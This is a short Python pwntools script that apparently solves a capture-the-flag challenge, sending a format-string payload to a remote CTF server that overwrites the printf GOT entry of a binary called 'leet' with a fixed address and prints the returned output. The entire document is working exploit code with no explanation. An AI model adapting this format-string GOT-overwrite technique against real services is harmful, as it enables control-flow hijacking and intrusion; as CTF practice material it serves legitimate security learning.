from pwn import *

elf = ELF("./leet")
printf_offset = elf.symbols["got.printf"]

flag = p32(0x080491F6)
payload = fmtstr_payload(7, {printf_offset: flag})

r = remote("host5.metaproblems.com", 5040)
r.recvuntil(b"Enter a string to leet speakify:\n")
r.sendline(payload)
r.recvuntil(b"Leet Speak:\n")

print(r.recvall().decode(errors="ignore").strip())